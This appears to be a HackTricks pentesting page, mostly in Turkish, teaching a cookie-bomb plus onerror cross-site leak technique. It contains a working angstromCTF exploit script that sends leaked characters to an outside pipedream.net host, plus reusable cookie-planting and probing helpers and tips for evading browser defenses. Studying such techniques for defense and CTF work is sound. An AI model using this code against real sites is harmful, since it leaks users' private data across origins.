# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: hedef origin için kurbanın tarayıcısını birçok/büyük cookie ile doldurarak sonraki isteklerin sunucu/istek limitlerine takılmasını sağlar (istek header boyutu, yönlendirmelerde URL boyutu vb.).
- Error-event oracle: bir `<script>` (veya başka bir subresource) ile cross-origin bir endpoint'i test edip `onload` vs `onerror` ile durumları ayırt etme.

High level idea
- İki durumu farklı davranan bir hedef endpoint bulun (ör. örn. arama için “hit” vs “miss”).
- “Hit” yolu ağır bir redirect zinciri veya uzun URL tetikleyecek şekilde olsun, “miss” yolu kısa kalsın. Çok sayıda cookie kullanarak istek headerlarını şişirin, böylece yalnızca “hit” yolu sunucunun bir HTTP hatası (örn. 431/414/400) ile başarısız olmasına neden olsun. Bu hata onerror olayını tetikler ve XS-Search için bir oracle olur.

When does this work
- Kurbanın tarayıcısının hedefe cookie göndermesini sağlayabiliyorsanız (örn. cookie'ler SameSite=None ise veya bir popup `window.open` ile bir first-party bağlamında onları ayarlayabiliyorsanız).
- Sömürebileceğiniz bir uygulama özelliği varsa — örn. kontrollü input isim/değerlerini Set-Cookie'ye dönüştüren “save preference” endpoint'leri ya da saldırgan kontrollü veriyi URL'ye dahil eden post-auth redirect'ler.
- Sunucu iki durumda farklı tepki veriyor ve şişirilmiş headerlar/URL ile bir durum bir limiti aşıp onerror'ı tetikleyecek bir hata cevabı döndürüyor.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large genellikle cookie'lerin istek headerlarını şişirmesiyle döndürülür; 414 URI Too Long veya sunucuya özgü bir 400, uzun istek hedefleri için döndürülebilir. Bu durumların herhangi biri başarısız bir subresource yüklemesine yol açar ve onerror'ı tetikler. Tipik nedenler için [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) bakın.

<details>
<summary>Practical example (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Neden popup (`window.open`)?
- Modern tarayıcılar üçüncü taraf çerezlerini giderek daha fazla engelliyor. Hedefe üst düzey bir pencere açmak çerezleri birinci taraf hâline getirir; böylece hedeften gelen Set-Cookie yanıtları kalıcı olur ve üçüncü taraf çerez kısıtlamalarına rağmen cookie-bomb adımını mümkün kılar.

2024–2025 çerez kullanılabilirliği notları
- Chrome’un Tracking Protection dağıtımı (Ocak 2024) rastgele bir kohort için zaten üçüncü taraf çerezlerini engelliyor ve UK CMA onay verdiğinde tüm kullanıcı tabanına genişlemesi planlanıyor; bu yüzden her kurbanın aniden 3P çerezlerini kaybedebileceğini varsayın. Geriye dönmeyi otomatikleştirin: betiğinizin probe'ının hedefe hiç ulaşmadan başarısız olduğunu tespit edin ve şeffaf şekilde popup/first-party akışına pivot edin. Safari ve Firefox zaten varsayılan olarak çoğu üçüncü taraf çerezini engelliyor ve CHIPS/partitioned cookies her üst düzey sitenin artık kendi kavanozuna sahip olduğu anlamına geliyor.
- Bir first‑party cookie planting akışı kullanın (`window.open` + auto-submit to a cookie-setting endpoint) ve ardından yalnızca o çerezler gönderildiğinde başarılı olan bir subresource ile probe yapın. Eğer üçüncü taraf çerezleri engellenmişse, probe'u same-site bağlamına taşıyın (ör. popup içinde same-site bir gadget aracılığıyla oracle'ı çalıştırıp boolean'ı `postMessage` veya sunucunuza bir beacon ile exfiltrate edin), veya eğer meşru olarak kontrol ediyorsanız kurban origin'ini Chrome’un deprecation trial'ına kaydedin.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

Cross-site bağlamından onlarca çerez koymanız gerektiğinde, geçici bir üst düzey pencere açın ve savunmasız Set-Cookie endpoint'ine bir dizi aşırı büyük form gönderimi gönderin:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Probing'e başlamadan hemen önce çağırın; böylece her oracle run taze şişirilmiş cookie jar ile başlar.

</details>

Generic probing helper
Eğer target origin (first-party) üzerinde birçok cookie ayarlamanın bir yoluna zaten sahipseniz, bu minimal oracle'ı başarı/başarısızlığın farklı network outcomes (status/MIME/redirect) ile sonuçlandığı herhangi bir endpoint'e karşı yeniden kullanabilirsiniz:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternatif tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Gelişmiş: de Bruijn–based cookie packing (CTF-proven)
- Uygulama size büyük cookie değerlerini kontrol etme imkanı veriyorsa, her probe'a bir de Bruijn sequence ekleyerek tahminleri verimli şekilde paketleyebilirsiniz. Bu, her probe başına ek yükü küçük tutar ve heavy branch'in sadece doğru prefix için tutarlı şekilde daha ağır olmasını sağlar. Örnek generator |Σ| sembolünden uzunluğu n olan (bir cookie değeri içine sığar):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Tips to build the oracle
- Pozitif durumu daha “ağır” yapın: koşul yalnızca doğru olduğunda ekstra bir redirect zincirleyin veya redirect URL'sinin kontrolsüz kullanıcı girdisini yansıtmasını sağlayın, böylece tahmin edilen prefix ile büyüsün.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Sunucular genelde header boyutunu sınırlar ve çok sayıda cookie olduğunda daha erken başarısız olurlar.
- Kararlı hale getirin: birden fazla paralel cookie set işlemi başlatın ve zamanlama ile önbellek gürültüsünü ortalamak için tekrar tekrar probe yapın.
- Önbellekleri aşın ve pooling artefaktlarından kaçının: probe URL'lere rastgele `#fragment` veya `?r=` ekleyin ve `window.open` döngüleri kullanırken farklı pencere isimlerini tercih edin.
- Alt kaynakları değiştirin: eğer `<script>` filtreleniyorsa `<link rel=stylesheet>` veya `<img>` deneyin. The onload/onerror boolean is the oracle; içeriğin parse edilmesine hiç gerek yoktur.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDN'ler ve sunucular farklı sınırlar uygular. Ekim 2025 itibarıyla Cloudflare kenarda request headers için toplam 128 KB (ve 16 KB URL) dokümante ediyor; hedefler bunun arkasındaysa daha fazla/daha büyük cookie gerekebilir. Diğer yığınlar (ör. Apache via LimitRequestFieldSize) genelde her header satırı için ~8 KB civarındadır ve daha erken hataya düşer. Bomb boyutunu buna göre ayarlayın (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) çapraz-origin kaynaklar için script tag yükleme/hata muhasebesini sıkılaştırdı (CVE-2025-5266). Yamalı istemcilerde belirli yönlendirilmiş cevaplar için `onerror` sinyali bastırılıyor; bu yüzden oracle'ı çeşitlendirin (paralel `<link rel=stylesheet>`, `<img>`, veya MIME uyuşmazlığı olan `fetch`) ve boolean'ın hâlâ tetiklendiğini varsaymadan önce hedef UA'yı fingerprint edin.
- Tracking Protection veya Fetch Metadata politikalarına sahip enterprise Chromium build'larının zaman zaman cookie'leri silebileceğini veya redirect'leri yeniden yazabileceğini bekleyin. Bu durumları önce kısa bir endpoint'i probe ederek tespit edin; başarısız olursa otomatik olarak saldırının tamamını popup içinde çalıştırmaya ve bilgileri `postMessage`/`BroadcastChannel` ile iletmeye pivotlayın.

Related XS-Search tricks
- URL uzunluğuna dayanan oracle'lar (cookie gerekmez) çok uzun bir istek hedefi zorlayabildiğiniz durumda birleştirilebilir veya onun yerine kullanılabilir:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
